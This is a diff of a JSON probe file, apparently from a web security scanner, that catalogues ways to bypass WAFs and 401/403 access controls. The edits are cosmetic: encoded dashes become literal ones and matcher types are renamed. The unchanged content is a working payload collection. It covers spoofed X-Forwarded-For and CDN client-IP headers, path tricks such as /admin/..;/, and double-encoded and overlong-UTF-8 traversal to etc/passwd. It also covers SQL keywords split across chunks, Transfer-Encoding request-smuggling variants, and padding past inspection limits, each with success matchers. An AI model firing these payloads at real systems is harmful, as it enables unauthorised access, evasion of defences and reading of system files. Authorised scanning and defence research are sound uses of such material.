@@ -1,9 +1,9 @@
 {
   "category": "waf_bypass_40x",
-  "description": "40x bypass surface \u2014 header / path / method / encoding / protocol tricks that flip 401/403 to 2xx on misconfigured ACLs, reverse proxies, WAFs, and admin route guards.",
+  "description": "40x bypass surface — header / path / method / encoding / protocol tricks that flip 401/403 to 2xx on misconfigured ACLs, reverse proxies, WAFs, and admin route guards.",
   "contexts": {
     "header_origin_spoof": {
-      "description": "Origin/IP spoofing headers (X-Forwarded-For=127.0.0.1, X-Original-URL, X-Rewrite-URL) \u2014 bypass IP allow-list ACLs or expose admin routes by forging proxy-trust headers.",
+      "description": "Origin/IP spoofing headers (X-Forwarded-For=127.0.0.1, X-Original-URL, X-Rewrite-URL) — bypass IP allow-list ACLs or expose admin routes by forging proxy-trust headers.",
       "tech_match": [
         "Nginx",
         "Apache",
@@ -60,7 +60,7 @@
       ]
     },
     "path_normalisation_tricks": {
-      "description": "Trailing slash, ;/, /./, %20, %09, double-slash, .json append \u2014 abuse reverse-proxy vs origin path normalisation drift.",
+      "description": "Trailing slash, ;/, /./, %20, %09, double-slash, .json append — abuse reverse-proxy vs origin path normalisation drift.",
       "tech_match": [
         "Nginx",
         "Apache",
@@ -74,7 +74,7 @@
       "probes": [
         {
           "payload": "/admin/",
-          "description": "Trailing slash bypass \u2014 proxy ACL exact-matches /admin only",
+          "description": "Trailing slash bypass — proxy ACL exact-matches /admin only",
           "matchers": [
             {
               "type": "status",
@@ -106,7 +106,7 @@
         },
         {
           "payload": "/admin/..;/",
-          "description": "Servlet path-traversal style \u2014 Tomcat / Spring legacy",
+          "description": "Servlet path-traversal style — Tomcat / Spring legacy",
           "matchers": [
             {
               "type": "status",
@@ -120,7 +120,7 @@
         },
         {
           "payload": "/admin%20",
-          "description": "Trailing space character bypass \u2014 Nginx vs Apache ACL drift",
+          "description": "Trailing space character bypass — Nginx vs Apache ACL drift",
           "matchers": [
             {
               "type": "status",
@@ -136,7 +136,7 @@
         },
         {
           "payload": "//admin",
-          "description": "Double-slash bypass \u2014 proxy normalises before ACL, origin treats as fresh path",
+          "description": "Double-slash bypass — proxy normalises before ACL, origin treats as fresh path",
           "matchers": [
             {
               "type": "status",
@@ -191,7 +191,7 @@
       "probes": [
         {
           "payload": "POST {{baseline}} (was 403 GET)",
-          "description": "Verb swap \u2014 ACL only protects GET",
+          "description": "Verb swap — ACL only protects GET",
           "matchers": [
             {
               "type": "status",
@@ -239,7 +239,7 @@
       "probes": [
         {
           "payload": "%252e%252e%252fetc%252fpasswd",
-          "description": "Double URL-encoded ../ \u2014 the WAF sees %252e (literal percent-two-five-two-e), the origin decodes twice to ../etc/passwd",
+          "description": "Double URL-encoded ../ — the WAF sees %252e (literal percent-two-five-two-e), the origin decodes twice to ../etc/passwd",
           "matchers": [
             {
               "type": "status",
@@ -260,7 +260,7 @@
         },
         {
           "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-          "description": "UTF-8 overlong encoding of .. \u2014 two-byte 0xC0 0xAE decodes to U+002E (dot) on vulnerable parsers (IIS, older Java)",
+          "description": "UTF-8 overlong encoding of .. — two-byte 0xC0 0xAE decodes to U+002E (dot) on vulnerable parsers (IIS, older Java)",
           "matchers": [
             {
               "type": "status",
@@ -281,7 +281,7 @@
         },
         {
           "payload": "..;/..;/admin",
-          "description": "Tomcat path-parameter bypass \u2014 semicolon confuses path normaliser. The proxy ACL sees ..;/ (not traversal), Tomcat strips the ;/ and resolves ..",
+          "description": "Tomcat path-parameter bypass — semicolon confuses path normaliser. The proxy ACL sees ..;/ (not traversal), Tomcat strips the ;/ and resolves ..",
           "matchers": [
             {
               "type": "status",
@@ -297,7 +297,7 @@
         },
         {
           "payload": "/..%2f..%2fadmin",
-          "description": "Mixed encoding \u2014 literal .. plus single-encoded / (%2f). Some WAFs decode only the first layer.",
+          "description": "Mixed encoding — literal .. plus single-encoded / (%2f). Some WAFs decode only the first layer.",
           "matchers": [
             {
               "type": "status",
@@ -330,7 +330,7 @@
           "description": "text/plain bypasses both CORS preflight AND many WAF body-parsing rules. The origin still parses the body as form or JSON based on content.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 403,
                 406
@@ -342,7 +342,7 @@
         },
         {
           "payload": "Content-Type: application/json; charset=ibm037",
-          "description": "EBCDIC charset \u2014 WAF parses body as ASCII (no pattern match), but some Java/.NET backends auto-transcode IBM037 to UTF-8 and process the payload.",
+          "description": "EBCDIC charset — WAF parses body as ASCII (no pattern match), but some Java/.NET backends auto-transcode IBM037 to UTF-8 and process the payload.",
           "matchers": [
             {
               "type": "status",
@@ -359,7 +359,7 @@
           "description": "Multipart body splits payload across parts/boundaries. Some WAFs inspect only the first part or fail to reassemble correctly.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 403,
                 415
@@ -374,7 +374,7 @@
           "description": "Swap JSON to form-urlencoded on API endpoints. If the WAF inspects only JSON bodies and the backend auto-parses form data, the payload evades inspection.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 400,
                 403,
@@ -388,7 +388,7 @@
       ]
     },
     "http_version_bypass": {
-      "description": "HTTP version tricks \u2014 some WAFs only inspect HTTP/1.1 text frames and pass HTTP/0.9, HTTP/1.0, or HTTP/2 binary frames uninspected.",
+      "description": "HTTP version tricks — some WAFs only inspect HTTP/1.1 text frames and pass HTTP/0.9, HTTP/1.0, or HTTP/2 binary frames uninspected.",
       "tech_match": [
         "Nginx",
         "HAProxy",
@@ -400,7 +400,7 @@
       "probes": [
         {
           "payload": "HTTP/1.0",
-          "description": "Downgrade to HTTP/1.0 \u2014 some WAFs and proxies only hook HTTP/1.1 processing. Connection: close header may also bypass keep-alive analysis.",
+          "description": "Downgrade to HTTP/1.0 — some WAFs and proxies only hook HTTP/1.1 processing. Connection: close header may also bypass keep-alive analysis.",
           "matchers": [
             {
               "type": "status",
@@ -414,7 +414,7 @@
         },
         {
           "payload": "HTTP/0.9 (raw TCP: GET /admin\\r\\n)",
-          "description": "HTTP/0.9 has no headers \u2014 WAFs that rely on header-based rules cannot inspect the request. Requires raw TCP (send_raw_request).",
+          "description": "HTTP/0.9 has no headers — WAFs that rely on header-based rules cannot inspect the request. Requires raw TCP (send_raw_request).",
           "matchers": [
             {
               "type": "word",
@@ -431,7 +431,7 @@
         },
         {
           "payload": "HTTP/2 upgrade with h2c",
-          "description": "Cleartext HTTP/2 upgrade (h2c) \u2014 WAFs that inspect only HTTP/1.1 text miss the binary H2 frames. Use with h2c-smuggling payload.",
+          "description": "Cleartext HTTP/2 upgrade (h2c) — WAFs that inspect only HTTP/1.1 text miss the binary H2 frames. Use with h2c-smuggling payload.",
           "matchers": [
             {
               "type": "status",
@@ -460,10 +460,10 @@
       "probes": [
         {
           "payload": "Transfer-Encoding: chunked\\r\\n\\r\\n7\\r\\nUNION \\r\\n6\\r\\nSELECT\\r\\n0\\r\\n\\r\\n",
-          "description": "Split SQL keyword across chunk boundary \u2014 'UNION ' in chunk 1, 'SELECT' in chunk 2. WAF sees two fragments, neither matches the UNION SELECT rule.",
+          "description": "Split SQL keyword across chunk boundary — 'UNION ' in chunk 1, 'SELECT' in chunk 2. WAF sees two fragments, neither matches the UNION SELECT rule.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 403
               ]
@@ -474,10 +474,10 @@
         },
         {
           "payload": "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity",
-          "description": "Duplicate TE headers \u2014 the proxy uses the first (chunked), the WAF uses the second (identity) or vice versa, causing desync in body parsing.",
+          "description": "Duplicate TE headers — the proxy uses the first (chunked), the WAF uses the second (identity) or vice versa, causing desync in body parsing.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 400,
                 403
@@ -489,10 +489,10 @@
         },
         {
           "payload": "Transfer-Encoding: \\tchunked",
-          "description": "Leading tab before 'chunked' \u2014 some WAFs fail to normalise whitespace in the TE value and fall back to Content-Length parsing, while the origin accepts it as chunked.",
+          "description": "Leading tab before 'chunked' — some WAFs fail to normalise whitespace in the TE value and fall back to Content-Length parsing, while the origin accepts it as chunked.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 400,
                 403
@@ -505,7 +505,7 @@
       ]
     },
     "ip_rotation_bypass": {
-      "description": "Source-IP spoofing via trusted-proxy headers \u2014 when the WAF or rate-limiter reads client IP from a header instead of the TCP socket, spoofing the header evades IP-based blocks.",
+      "description": "Source-IP spoofing via trusted-proxy headers — when the WAF or rate-limiter reads client IP from a header instead of the TCP socket, spoofing the header evades IP-based blocks.",
       "tech_match": [
         "Cloudflare",
         "AWS ALB",
@@ -519,7 +519,7 @@
       "probes": [
         {
           "payload": "X-Forwarded-For: 127.0.0.1\\r\\nX-Real-IP: 127.0.0.1\\r\\nX-Originating-IP: 127.0.0.1",
-          "description": "Triple IP-spoof header stack \u2014 covers the three most common proxy-trust headers. If any one is used for rate-limit or IP ACL, the block is evaded.",
+          "description": "Triple IP-spoof header stack — covers the three most common proxy-trust headers. If any one is used for rate-limit or IP ACL, the block is evaded.",
           "matchers": [
             {
               "type": "status",
@@ -535,7 +535,7 @@
         },
         {
           "payload": "True-Client-IP: 127.0.0.1\\r\\nCF-Connecting-IP: 127.0.0.1",
-          "description": "Cloudflare/Akamai-specific IP headers \u2014 True-Client-IP (Akamai), CF-Connecting-IP (Cloudflare). If the origin trusts these without verifying they came from the CDN, IP ACLs are bypassable.",
+          "description": "Cloudflare/Akamai-specific IP headers — True-Client-IP (Akamai), CF-Connecting-IP (Cloudflare). If the origin trusts these without verifying they came from the CDN, IP ACLs are bypassable.",
           "matchers": [
             {
               "type": "status",
@@ -554,7 +554,7 @@
           "description": "Random IP in XFF to evade per-IP rate limiting. Each request appears from a different source. Use concurrent_requests with rotating XFF.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 429
               ]
@@ -609,7 +609,7 @@
           "description": "Check response headers on a clean request for WAF fingerprints: CF-Ray (Cloudflare), X-Sucuri-ID (Sucuri), X-CDN (various), Server header containing product names.",
           "matchers": [
             {
-              "type": "header_word",
+              "type": "header",
               "words": [
                 "cloudflare",
                 "akamai",
@@ -631,11 +631,11 @@
       ]
     },
     "body_size_overflow": {
-      "description": "Pad request body past WAF inspection limit \u2014 WAFs inspect only the first N bytes. Payload placed after the limit bypasses inspection entirely.",
+      "description": "Pad request body past WAF inspection limit — WAFs inspect only the first N bytes. Payload placed after the limit bypasses inspection entirely.",
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "8KB padding \u2014 AWS WAF default inspection limit is 8KB. Prepend 8192 bytes of benign data (repeated 'a=1&' pairs or JSON padding) before the injection payload. The WAF sees only the benign prefix.",
+          "description": "8KB padding — AWS WAF default inspection limit is 8KB. Prepend 8192 bytes of benign data (repeated 'a=1&' pairs or JSON padding) before the injection payload. The WAF sees only the benign prefix.",
           "matchers": [
             {
               "type": "word",
@@ -649,7 +649,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "128KB padding \u2014 Cloudflare and ModSecurity default inspection limit is ~128KB. Pad with JSON array or form-urlencoded noise. The injection payload sits past byte 131072.",
+          "description": "128KB padding — Cloudflare and ModSecurity default inspection limit is ~128KB. Pad with JSON array or form-urlencoded noise. The injection payload sits past byte 131072.",
           "matchers": [
             {
               "type": "word",
@@ -663,10 +663,10 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "Multipart boundary split \u2014 send the payload in a multipart body where the injection is in a later part. Some WAFs only inspect the first part or first N bytes of multipart content.",
+          "description": "Multipart boundary split — send the payload in a multipart body where the injection is in a later part. Some WAFs only inspect the first part or first N bytes of multipart content.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 403,
                 406
@@ -677,7 +677,7 @@
       ]
     },
     "smuggling_clte_bypass": {
-      "description": "CL.TE request smuggling to bypass WAF \u2014 the WAF reads Content-Length (sees clean prefix), the backend reads Transfer-Encoding:chunked (sees the payload in a smuggled second request)",
+      "description": "CL.TE request smuggling to bypass WAF — the WAF reads Content-Length (sees clean prefix), the backend reads Transfer-Encoding:chunked (sees the payload in a smuggled second request)",
       "probes": [
         {
           "payload": "{{baseline}}",
@@ -709,7 +709,7 @@
           "description": "TE.TE obfuscation: both hop read Transfer-Encoding but disagree on obfuscated variants (Transfer-Encoding: xchunked, Transfer-Encoding: chunked\\r\\n, Transfer-Encoding: [tab]chunked). The WAF falls back to CL while the origin uses chunked.",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 400
               ]
